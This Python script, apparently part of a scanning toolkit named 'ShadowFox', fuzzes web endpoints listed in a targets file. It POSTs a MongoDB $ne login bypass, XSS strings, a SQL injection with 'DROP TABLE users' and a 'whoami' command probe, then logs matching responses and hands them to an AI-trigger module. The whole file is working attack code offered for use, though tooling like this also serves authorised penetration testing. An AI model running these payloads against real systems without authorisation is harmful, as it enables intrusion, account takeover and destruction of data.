import requests
import json
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def fuzz_json_body(url):
    payloads = [
        {"username": "admin", "password": {"$ne": None}},  # MongoDB
        {"input": "<script>alert(1)</script>"},
        {"search": "test'; DROP TABLE users; --"},
        {"cmd": "whoami"},
        {"email": "\" onerror=\"alert(1)"},
    ]

    headers = {
        "User-Agent": "ShadowFox-JSONFuzz",
        "Content-Type": "application/json"
    }

    for payload in payloads:
        try:
            res = requests.post(url, headers=headers, data=json.dumps(payload), timeout=8)
            if res.status_code == 200 and ("alert" in res.text or "root" in res.text or "syntax" in res.text.lower()):
                log_to_text(f"[FUZZ_JSON_BODY] {url} -> {payload}")
                severity = classify_severity(res.text)
                ai_trigger_if_needed("Fuzz JSON Body", url, json.dumps(payload), res.text, severity)
                print(f"[+] JSON fuzz uspešan: {url} sa {payload}")
        except Exception as e:
            print(f"[-] Greška kod {url}: {e}")

    print("[-] JSON fuzz završen.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()
    
    for url in urls:
        fuzz_json_body(url)
